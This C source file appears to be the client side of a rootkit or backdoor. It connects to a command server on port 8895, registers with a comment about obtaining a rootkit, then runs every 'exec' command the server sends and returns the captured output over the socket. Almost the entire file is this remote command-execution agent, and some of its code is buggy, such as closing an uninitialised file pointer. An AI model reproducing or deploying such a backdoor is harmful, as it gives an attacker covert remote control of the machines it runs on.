#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <errno.h>

#define SP_PORT     8895
#define BUFFER_SIZE 4096
#define SERVER_ADDR "127.0.0.1"
#define CMD_RESULT "cmdoutput.txt"

int readbuf(int conn, char* buf, int size);
int readline(int conn, char* buf, int size);
int getIntFromBuf(char* buf, int offset);
int execcmd(char* cmd);
int sendresult(int socket, char* buf);

int main()
{
    int sock_cli = socket(AF_INET,SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    char recvbuf[BUFFER_SIZE];
    int filesize, chunk;
    FILE *fp;    
    char *cmd;
    struct timeval timeout={1800,0};

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SP_PORT); 
    servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
    setsockopt(sock_cli,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
    
    if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("Connection error\n");
        exit(1);
    }
    char *req = "register\n";                         // Req for obtain a rootkit
    send(sock_cli, req, strlen(req),0); 
    
    memset(recvbuf, 0, sizeof(recvbuf));    
    readbuf(sock_cli, recvbuf, 3);                    // Read ACK
    if(strcmp(recvbuf, "ACK") == 0){
        while(1){
            memset(recvbuf, 0, sizeof(recvbuf));
            readline(sock_cli, recvbuf, BUFFER_SIZE);
            
            if(strcmp(recvbuf, "close") == 0){
                break;
            } else if(strncmp(recvbuf, "exec", 4) == 0){
                execcmd(recvbuf + 4);
                sendresult(sock_cli, recvbuf);
            }
        }
    }
    
    fclose(fp);
    close(sock_cli);
    return 0;
}

int sendresult(int socket, char* buf){
    FILE *fp;
    int i = 0;
    
    fp=fopen(CMD_RESULT,"r");
    while((buf[i]=fgetc(fp)) != EOF && i < BUFFER_SIZE-1){
        i++;
    }
    fclose(fp);
    buf[i] = '\0';
    buf[i+1] = EOF;
    send(socket, buf, strlen(buf) + 1,0); 
    
    return 0;
}

int execcmd(char* cmd){
    pthread_t tid;
    
    char *args[20];
    int i, j;
    char *str = (char*) malloc(strlen(cmd)*sizeof(char));
    
    while(*cmd == ' ') cmd++;
    for(i=0, j=0; ; cmd++){
        if(*cmd == ' ' || *cmd == '\n'){
            str[j] = '\0';
            args[i] = str;
            printf("=%s=\n", str);
            if(*cmd == '\n'){
                args[i+1] = NULL;
                break;
            }
            str = (char*) malloc(strlen(cmd)*sizeof(char));
            i++;
            j=0;
        } else {
            str[j] = *cmd;
            j++;
        }
    }
    
    if((i=fork()) == 0){
        freopen(CMD_RESULT, "w", stdout);
        execvp(args[0], args); 
    }
    waitpid(i, &j, 0);
    for(i=0; args[i] != NULL; i++){
        free(args[i]);
    }
    return 0;
}

int readbuf(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
        } 
    }
    return cur;
}

int readline(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
            if(buf[cur-1] == '\n'){
                break;
            }
        } 
    }
    return cur;
}

int getIntFromBuf(char* buf, int offset){
    int value;    
    value = (int) ( ((buf[offset] & 0xFF)<<24)  
            |((buf[offset+1] & 0xFF)<<16)  
            |((buf[offset+2] & 0xFF)<<8)  
            |(buf[offset+3] & 0xFF));  
    return value;
}